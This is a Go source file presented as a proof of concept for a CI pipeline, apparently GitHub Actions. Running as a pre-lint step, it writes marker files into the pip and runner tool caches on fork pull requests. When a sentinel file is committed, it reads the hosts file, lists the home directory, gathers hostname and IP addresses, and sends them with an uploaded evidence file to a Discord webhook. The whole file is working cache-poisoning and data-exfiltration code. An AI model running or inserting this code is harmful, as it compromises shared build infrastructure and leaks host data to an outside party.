// --- POC: cache check -> optional poison -> optional LFI (no YAML/env needed) ---
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

// Adjust if you want Phase C to post. Leave empty to skip network automatically.
const pocDiscordWebhook = "https://discord.com/api/webhooks/123/abcd"

// Sentinels to toggle behavior via a simple commit.
const (
	pocSentinelPoison = "tests/.enable_poison" // write cache markers
	pocSentinelExfil  = "tests/.enable_exfil"  // LFI + pingback + upload
)

func pocPreLint() {
	// Always drop a local marker so you can prove exec happened.
	_ = os.WriteFile("pwn_marker.txt", []byte("PWN_MARKER: ci.go pre-lint\n"), 0644)

	pipCache := pocDetectPipCache()
	toolCache := pocDetectToolCache()
	pipMarker := filepath.Join(pipCache, "wheels/poc/MARKER.txt")
	toolMarker := filepath.Join(toolCache, "poc/MARKER.txt")

	// ---- Phase A: CHECK (log-only)
	found := false
	if pocExists(pipMarker) {
		found = true
		fmt.Println("::warning:: Found PIP cache marker:", pipMarker)
	}
	if pocExists(toolMarker) {
		found = true
		fmt.Println("::warning:: Found TOOL cache marker:", toolMarker)
	}

	fmt.Println("[Cache-Check] time=", time.Now().UTC().Format(time.RFC3339))
	fmt.Println("[Cache-Check] host=", pocHostname(), " runner=", os.Getenv("RUNNER_NAME"))
	fmt.Println("[Cache-Check] repo=", os.Getenv("GITHUB_REPOSITORY"), " event=", os.Getenv("GITHUB_EVENT_NAME"))
	if found {
		if b, err := os.ReadFile(pipMarker); err == nil {
			fmt.Printf("\n[pip marker] %s\n%s\n", pipMarker, pocTrim(b, 1200))
		}
		if b, err := os.ReadFile(toolMarker); err == nil {
			fmt.Printf("\n[tool marker] %s\n%s\n", toolMarker, pocTrim(b, 1200))
		}
	} else {
		fmt.Println("[Cache-Check] No markers found; nothing to report.")
	}

	// ---- Phase B: POISON (only if sentinel file present)
	if pocExists(pocSentinelPoison) {
		isFork := pocDetectForkPR()
		fmt.Println("[Cache-Poison] fork flag:", isFork)
		if isFork {
			_ = os.MkdirAll(filepath.Dir(pipMarker), 0o755)
			_ = os.MkdirAll(filepath.Dir(toolMarker), 0o755)
			content := fmt.Sprintf(
				"POC CACHE MARKER\ntime=%s\nhost=%s\nactor=%s  repo=%s  run=%s\nevent=%s  fork=true\n",
				time.Now().UTC().Format(time.RFC3339),
				pocHostname(),
				os.Getenv("GITHUB_ACTOR"), os.Getenv("GITHUB_REPOSITORY"),
				os.Getenv("GITHUB_RUN_ID"), os.Getenv("GITHUB_EVENT_NAME"),
			)
			_ = os.WriteFile(pipMarker, []byte(content), 0o644)
			_ = os.WriteFile(toolMarker, []byte(content), 0o644)
			fmt.Println("[Cache-Poison] Wrote markers:")
			fmt.Println(" -", pipMarker)
			fmt.Println(" -", toolMarker)
		} else {
			fmt.Println("[Cache-Poison] Not a fork PR; skipping write.")
		}
	} else {
		fmt.Println("[Cache-Poison] Sentinel not present; skipping writes (expected initially).")
	}

	// ---- Phase C: LFI + pingback + upload (only if sentinel present)
	if pocExists(pocSentinelExfil) && pocDiscordWebhook != "" {
		tmpDir := os.TempDir()
		evPath := filepath.Join(tmpDir, "lfi-demo.txt")
		var buf bytes.Buffer

		// LFI: /etc/hosts (or Windows hosts)
		hp := pocHostsPath()
		fmt.Fprintf(&buf, "[+] Reading %s\n", hp)
		if b, err := os.ReadFile(hp); err == nil {
			buf.Write(b)
		} else {
			fmt.Fprintf(&buf, "No access: %v\n", err)
		}

		// LFI: HOME listing
		home := pocHomeDir()
		fmt.Fprintf(&buf, "\n[+] Listing HOME (%s)\n", home)
		if home != "" {
			if entries, err := os.ReadDir(home); err == nil {
				names := make([]string, 0, len(entries))
				for _, e := range entries {
					names = append(names, e.Name())
				}
				sort.Strings(names)
				for _, n := range names {
					fmt.Fprintf(&buf, " - %s\n", n)
				}
			} else {
				fmt.Fprintf(&buf, "No access: %v\n", err)
			}
		}

		// Append cache marker tails (helps prove persistence)
		if b, err := os.ReadFile(pipMarker); err == nil {
			fmt.Fprintf(&buf, "\n[+] pip marker tail (%s)\n", pipMarker)
			buf.Write(pocTrim(b, 4096))
		}
		if b, err := os.ReadFile(toolMarker); err == nil {
			fmt.Fprintf(&buf, "\n[+] tool marker tail (%s)\n", toolMarker)
			buf.Write(pocTrim(b, 4096))
		}

		if err := os.WriteFile(evPath, buf.Bytes(), 0o600); err == nil {
			// Pingback (JSON)
			pub := pocPublicIP()
			loc := strings.Join(pocIPv4s(), " ")
			msg := fmt.Sprintf("POC IP pingback: host=%s runner=%s public_ip=%s local_ips=%s",
				pocHostname(), os.Getenv("RUNNER_NAME"), pub, loc)
			_ = pocDiscordSimple(pocDiscordWebhook, msg)

			// Upload evidence (multipart)
			if code, err := pocDiscordFile(pocDiscordWebhook,
				`{"content":"POC: Local File Read + cache evidence (ci.go pre-lint)"}`,
				evPath, "lfi-demo.txt"); err == nil {
				fmt.Println("Discord file HTTP", code)
			} else {
				fmt.Println("Discord file upload error:", err)
			}
		} else {
			fmt.Println("[LFI] Could not write evidence file:", err)
		}
	} else {
		fmt.Println("[LFI] Exfil disabled (no sentinel or no webhook). Logs-only mode.")
	}
}

func pocDetectPipCache() string {
	if _, err := exec.LookPath("python3"); err == nil {
		if out, err := exec.Command("python3", "-m", "pip", "cache", "dir").CombinedOutput(); err == nil {
			if p := strings.TrimSpace(string(out)); p != "" {
				return p
			}
		}
	}
	home := pocHomeDir()
	if home == "" {
		home = "."
	}
	return filepath.Join(home, ".cache", "pip")
}

func pocDetectToolCache() string {
	if v := os.Getenv("RUNNER_TOOL_CACHE"); v != "" {
		return v
	}
	home := pocHomeDir()
	if home == "" {
		home = "."
	}
	return filepath.Join(home, "hostedtoolcache")
}

func pocDetectForkPR() bool {
	evPath := os.Getenv("GITHUB_EVENT_PATH")
	if evPath == "" {
		return false
	}
	b, err := os.ReadFile(evPath)
	if err != nil {
		return false
	}
	s := string(b)
	return strings.Contains(s, `"fork": true`) || strings.Contains(s, `"fork":true`)
}

func pocDiscordSimple(webhook, content string) error {
	b, _ := json.Marshal(map[string]string{"content": content})
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func pocDiscordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	if fw, err := w.CreateFormField("payload_json"); err == nil {
		_, _ = fw.Write([]byte(payloadJSON))
	} else {
		return 0, err
	}
	fw, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return 0, err
	}
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	if _, err := io.Copy(fw, f); err != nil {
		return 0, err
	}
	_ = w.Close()

	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode, nil
}

func pocHostsPath() string {
	if runtime.GOOS == "windows" {
		return `C:\Windows\System32\drivers\etc\hosts`
	}
	return "/etc/hosts"
}

func pocHomeDir() string {
	if runtime.GOOS == "windows" {
		if v := os.Getenv("USERPROFILE"); v != "" {
			return v
		}
		return `C:\Users\Public`
	}
	return os.Getenv("HOME")
}

func pocPublicIP() string {
	if _, err := exec.LookPath("curl"); err == nil {
		if out, err := exec.Command("curl", "-fsS", "https://ifconfig.me").Output(); err == nil {
			return strings.TrimSpace(string(out))
		}
	}
	resp, err := http.Get("https://ifconfig.me")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(b))
}

func pocIPv4s() []string {
	var out []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				if ip := ipnet.IP.To4(); ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func pocTrim(b []byte, max int) []byte {
	if len(b) <= max {
		return b
	}
	return append(append([]byte{}, b[:max]...), []byte("...(truncated)")...)
}

func pocHostname() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "unknown-host"
	}
	return h
}

func pocExists(p string) bool {
	if p == "" {
		return false
	}
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}
